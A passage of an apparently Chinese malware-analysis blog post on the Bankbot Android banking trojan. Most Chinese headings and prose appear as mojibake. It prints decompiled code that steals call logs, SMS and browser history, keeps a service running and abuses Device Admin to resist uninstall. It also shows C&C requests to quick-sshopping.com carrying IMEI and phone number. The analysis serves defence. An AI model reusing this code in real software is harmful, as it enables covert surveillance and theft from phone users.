class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">this</span>.hangUp(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">label_106:</span><br><span class="line"><span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">    v11 = <span class="string">&quot;incoming call&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ReportWithDataTask</span>(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;[&quot;</span> + <span class="built_in">this</span>.toJSON(v2, </span><br><span class="line">        v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="éšç§çªƒå–"><a href="#éšç§çªƒå–" class="headerlink" title="éšç§çªƒå–"></a>éšç§çªƒå–</h3><h4 id="è·å–ç”µè¯æ‹¨æ‰“è®°å½•"><a href="#è·å–ç”µè¯æ‹¨æ‰“è®°å½•" class="headerlink" title="è·å–ç”µè¯æ‹¨æ‰“è®°å½•"></a>è·å–ç”µè¯æ‹¨æ‰“è®°å½•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getCallLog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v20</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v18</span> <span class="operator">=</span> <span class="string">&quot;O||U|T||||G|O|||I|N||G|&quot;</span>.replace(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(CallLog$Calls.CONTENT_URI, <span class="literal">null</span>, <span class="literal">null</span>, </span><br><span class="line">            <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v15</span> <span class="operator">=</span> <span class="string">&quot;I++N+C+O+++M+I++N+G+&quot;</span>.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v16</span> <span class="operator">=</span> <span class="string">&quot;M-I--S--S---E--D---&quot;</span>.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v22</span> <span class="operator">=</span> <span class="string">&quot;***&#123;\&quot;n*u**mb**e*r\&quot;***:%s,\&quot;da****te\&quot;:%s,\&quot;d*u*ra****ti*o***n\&quot;:%s,\&quot;t*yp***e\&quot;:%s&#125;*&quot;</span></span><br><span class="line">            .replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((v10.moveToFirst()) &amp;&amp; v10.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v17</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;number&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v21</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v11</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">v14</span> <span class="operator">=</span> v10.getColumnIndex(<span class="string">&quot;duration&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(!v10.isAfterLast()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">v19</span> <span class="operator">=</span> v10.getString(v17);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v9</span> <span class="operator">=</span> v10.getString(v21);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v7</span> <span class="operator">=</span> v10.getString(v11);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v8</span> <span class="operator">=</span> v10.getString(v14);</span><br><span class="line">            <span class="type">String</span> <span class="variable">v13</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">switch</span>(Integer.parseInt(v9)) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                    v13 = v15;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                    v13 = v18;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                    v13 = v16;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v20.append(String.format(Locale.US, v22, JSONObject.quote(v19), JSONObject.quote(</span><br><span class="line">                    v7), JSONObject.quote(v8), JSONObject.quote(v13)));</span><br><span class="line">            <span class="keyword">if</span>(!v10.isLast()) &#123;</span><br><span class="line">                v20.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v10.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v10.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v20.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è·å–çŸ­ä¿¡è®°å½•"><a href="#è·å–çŸ­ä¿¡è®°å½•" class="headerlink" title="è·å–çŸ­ä¿¡è®°å½•"></a>è·å–çŸ­ä¿¡è®°å½•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getSmsLog</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(Uri.parse(<span class="string">&quot;content://ABC&quot;</span>.replace(<span class="string">&quot;A&quot;</span>, </span><br><span class="line">            <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot;B&quot;</span>, <span class="string">&quot;m&quot;</span>).replace(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;s&quot;</span>)), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v8.moveToFirst()) &amp;&amp; v8.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v8.isAfterLast()) &#123;</span><br><span class="line">            v10.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;address\&quot;:%s,\&quot;body\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, </span><br><span class="line">                    JSONObject.quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;address&quot;</span>))), JSONObject</span><br><span class="line">                    .quote(v8.getString(v8.getColumnIndex(<span class="string">&quot;body&quot;</span>))), JSONObject.quote(v8.getString(</span><br><span class="line">                    v8.getColumnIndex(<span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v8.isLast()) &#123;</span><br><span class="line">                v10.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v8.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v8.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v10.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æµè§ˆå™¨ä¹¦ç­¾"><a href="#æµè§ˆå™¨ä¹¦ç­¾" class="headerlink" title="æµè§ˆå™¨ä¹¦ç­¾"></a>æµè§ˆå™¨ä¹¦ç­¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> StringBuilder <span class="title function_">getHistory</span><span class="params">(Uri historyUri)</span> &#123;</span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="type">Cursor</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getContentResolver().query(historyUri, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;title&quot;</span>, <span class="string">&quot;url&quot;</span>, </span><br><span class="line">            <span class="string">&quot;date&quot;</span>&#125;, <span class="string">&quot;bookmark = 0&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>((v6.moveToFirst()) &amp;&amp; v6.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(!v6.isAfterLast()) &#123;</span><br><span class="line">            v8.append(String.format(Locale.US, <span class="string">&quot;&#123;\&quot;title\&quot;:%s,\&quot;url\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, JSONObject</span><br><span class="line">                    .quote(v6.getString(v6.getColumnIndex(<span class="string">&quot;title&quot;</span>))), JSONObject.quote(v6.getString(</span><br><span class="line">                    v6.getColumnIndex(<span class="string">&quot;url&quot;</span>))), JSONObject.quote(v6.getString(v6.getColumnIndex(</span><br><span class="line">                    <span class="string">&quot;date&quot;</span>)))));</span><br><span class="line">            <span class="keyword">if</span>(!v6.isLast()) &#123;</span><br><span class="line">                v8.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v6.moveToNext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v6.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v8.append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="éª—å–ä¿¡ç”¨å¡ä¿¡æ¯"><a href="#éª—å–ä¿¡ç”¨å¡ä¿¡æ¯" class="headerlink" title="éª—å–ä¿¡ç”¨å¡ä¿¡æ¯"></a>éª—å–ä¿¡ç”¨å¡ä¿¡æ¯</h2><p>å½“ç”¨æˆ·æ‰“å¼€Google Play åº”ç”¨æ—¶ï¼Œæ‰“å¼€ä¼ªé€ çš„Activityï¼Œè¯±ä½¿ç”¨æˆ·è¾“å…¥ä¿¡ç”¨å¡ä¿¡æ¯ã€‚</p>
<h2 id="é«˜çº§æŠ€æœ¯"><a href="#é«˜çº§æŠ€æœ¯" class="headerlink" title="é«˜çº§æŠ€æœ¯"></a>é«˜çº§æŠ€æœ¯</h2><h3 id="ä¸æ–­é‡å¯çš„Servcie"><a href="#ä¸æ–­é‡å¯çš„Servcie" class="headerlink" title="ä¸æ–­é‡å¯çš„Servcie"></a>ä¸æ–­é‡å¯çš„Servcie</h3><p>com.android.smali3</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onDestroy();</span><br><span class="line">    <span class="built_in">this</span>.startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>.getApplicationContext(), smali3.class));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡è¢«åœæ­¢ï¼Œç«‹å³é‡å¯ï¼Œæ— æ³•åœæ­¢ã€‚</p>
<h3 id="é˜²æ­¢å¸è½½"><a href="#é˜²æ­¢å¸è½½" class="headerlink" title="é˜²æ­¢å¸è½½"></a>é˜²æ­¢å¸è½½</h3><p>Bankbot ç”³è¯· Device Admin æƒé™ï¼Œæ— æ³•è¢«æ­£å¸¸å¸è½½ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb shell pm uninstall com.android.market</span><br><span class="line">Failure</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ç¦æ­¢åˆ é™¤-Device-Admin-æƒé™"><a href="#ç¦æ­¢åˆ é™¤-Device-Admin-æƒé™" class="headerlink" title="ç¦æ­¢åˆ é™¤ Device Admin æƒé™"></a>ç¦æ­¢åˆ é™¤ Device Admin æƒé™</h3><p>è¿™ä¸ªä¸€ä¸ªéå¸¸æµæ°“çš„åšæ³•ï¼Œå…·ä½“çš„åšæ³•æ˜¯å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdRec</span> <span class="keyword">extends</span> <span class="title class_">DeviceAdminReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AdRec</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> CharSequence <span class="title function_">onDisableRequested</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AppCrash</span>().Register(context);</span><br><span class="line">        <span class="keyword">if</span>(Build$VERSION.SDK_INT &lt;= <span class="number">0xA</span>) &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.settings.SETTINGS&quot;</span>);</span><br><span class="line">            v2.setFlags(<span class="number">0x50000000</span>);</span><br><span class="line">            context.startActivity(v2);</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.MAIN&quot;</span>);</span><br><span class="line">            v4.addCategory(<span class="string">&quot;android.intent.category.HOME&quot;</span>);</span><br><span class="line">            v4.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">            context.startActivity(v4);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        context.startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(context, ASec.class));</span><br><span class="line">        <span class="type">long</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="number">0x7D0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(InterruptedException v3) &#123;</span><br><span class="line">            v3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‡å†™ DeviceAdminReceiver çš„ onDisableRequest æ–¹æ³•ã€‚ä½¿ç”¨ Thread.sleep æ–¹æ³•ä½¿ç”¨æˆ·<br>æ— æ³•æ“ä½œç•Œé¢ï¼Œåœ¨æ­¤æœŸé—´é‡‡å– Activity åˆ‡æ¢çš„æ–¹æ³•ç»•å¼€å–æ¶ˆæ¿€æ´»çš„æ­¥éª¤ã€‚</p>
<p>è¿™é‡Œå‡ºè¿‡å‡ ä¸ªé—®é¢˜ï¼Œ</p>
<ol>
<li>Backdoor.AndroidOS.Obad.a ä½¿ç”¨çš„ï¼Œåœ¨è®¾å¤‡ç®¡ç†å™¨ä¸­éšèº«</li>
<li>å°±æ˜¯ç°åœ¨ä»£ç ä¸­æ‰€ç”¨åˆ°è¿™ä¸ªï¼Œç›®å‰åœ¨æ‰€æœ‰çš„Android ç‰ˆæœ¬ä¸­å­˜åœ¨ã€‚</li>
</ol>
<h3 id="ç•Œé¢åŠ«æŒ"><a href="#ç•Œé¢åŠ«æŒ" class="headerlink" title="ç•Œé¢åŠ«æŒ"></a>ç•Œé¢åŠ«æŒ</h3><p>é€šè¿‡ç•Œé¢åŠ«æŒï¼Œè¯±ä½¿ç”¨æˆ·å°†Appè®¾ç½®ä¸ºè®¾å¤‡ç®¡ç†å™¨ã€‚ä»ä¸‹å›¾ä¸­å¯ä»¥çœ‹è§ContinuesæŒ‰é’®å…¶å®<br>æ˜¯è®¾å¤‡ç®¡ç†å™¨çš„æ¿€æ´»æŒ‰é’®ã€‚</p>
<h2 id="ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ"><a href="#ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ" class="headerlink" title="ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ"></a>ä½¿ç”¨ç¿ é¸Ÿå¯¹æ¶æ„æ ·æœ¬è¿›è¡Œæ£€æŸ¥çš„ç»“æœ</h2><h2 id="0x02-C-amp-C-åè®®åˆ†æ"><a href="#0x02-C-amp-C-åè®®åˆ†æ" class="headerlink" title="0x02 C&amp;C åè®®åˆ†æ"></a>0x02 C&amp;C åè®®åˆ†æ</h2><p>Bankbot ä»¥å›ºå®šæ—¶é—´è½®è¯¢çš„æ–¹å¼å‘C&amp;CæœåŠ¡å™¨è¯·æ±‚å‘½ä»¤ï¼Œå‘½ä»¤çš„æ ¼å¼ä¸ºjsonæ ¼å¼ã€‚ä»ä»£ç ä¸­<br>å¯ä»¥å¾—åˆ°jsonå­—æ®µçš„ä¿¡æ¯ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_ACTION</span> <span class="operator">=</span> <span class="string">&quot;action&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_CALL_LOG</span> <span class="operator">=</span> <span class="string">&quot;call_log&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_DATA</span> <span class="operator">=</span> <span class="string">&quot;data&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_HISTORY</span> <span class="operator">=</span> <span class="string">&quot;browser_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_ID</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_IMEI</span> <span class="operator">=</span> <span class="string">&quot;imei&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_INTERCEPT</span> <span class="operator">=</span> <span class="string">&quot;intercept&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_MAYHEM</span> <span class="operator">=</span> <span class="string">&quot;mayhem&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;prefix_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_NEW_SERVER</span> <span class="operator">=</span> <span class="string">&quot;server&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_NUMBER_SEND_TO</span> <span class="operator">=</span> <span class="string">&quot;number_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_OPERATOR</span> <span class="operator">=</span> <span class="string">&quot;op&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_PHONE</span> <span class="operator">=</span> <span class="string">&quot;phone&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_POLL_INTERVAL</span> <span class="operator">=</span> <span class="string">&quot;server_poll&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;prefix&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_REPORT_CALLS</span> <span class="operator">=</span> <span class="string">&quot;calls&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_SMS_HISTORY</span> <span class="operator">=</span> <span class="string">&quot;sms_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_SPAM</span> <span class="operator">=</span> <span class="string">&quot;text_2&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_STATUS</span> <span class="operator">=</span> <span class="string">&quot;status&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_URL_TO_SHOW</span> <span class="operator">=</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_VERSION</span> <span class="operator">=</span> <span class="string">&quot;version&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="è¯·æ±‚æ³¨å†Œ"><a href="#è¯·æ±‚æ³¨å†Œ" class="headerlink" title="è¯·æ±‚æ³¨å†Œ"></a>è¯·æ±‚æ³¨å†Œ</h3><p>è¿”å›æŠ¥æ–‡</p>
<p>401</p>
<h3 id="æ³¨å†ŒæŠ¥æ–‡"><a href="#æ³¨å†ŒæŠ¥æ–‡" class="headerlink" title="æ³¨å†ŒæŠ¥æ–‡"></a>æ³¨å†ŒæŠ¥æ–‡</h3><p>è¯·æ±‚æŠ¥æ–‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 106</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=reg&amp;imei=098767899076562&amp;phone=15802920457&amp;op=Android&amp;version=4.4.4%2C3.4.0-gd853d22&amp;prefix=12Jhw21</span><br></pre></td></tr></table></figure>

<p>å“åº”æŠ¥æ–‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:21 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">200</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="è·å–å‘½ä»¤"><a href="#è·å–å‘½ä»¤" class="headerlink" title="è·å–å‘½ä»¤"></a>è·å–å‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 32</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=poll&amp;imei=098767899076562</span><br></pre></td></tr></table></figure>


